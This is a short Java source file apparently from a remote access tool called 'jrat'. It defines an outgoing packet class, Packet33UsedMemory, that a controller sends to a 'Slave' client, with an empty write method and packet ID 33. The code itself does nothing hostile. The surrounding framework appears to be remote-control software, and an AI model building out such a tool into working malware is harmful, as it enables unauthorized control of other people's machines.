package jrat.module.system;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;


public class Packet33UsedMemory implements OutgoingPacket {

	@Override
	public void write(Slave slave) throws Exception {

	}

	@Override
	public short getPacketId() {
		return 33;
	}

}
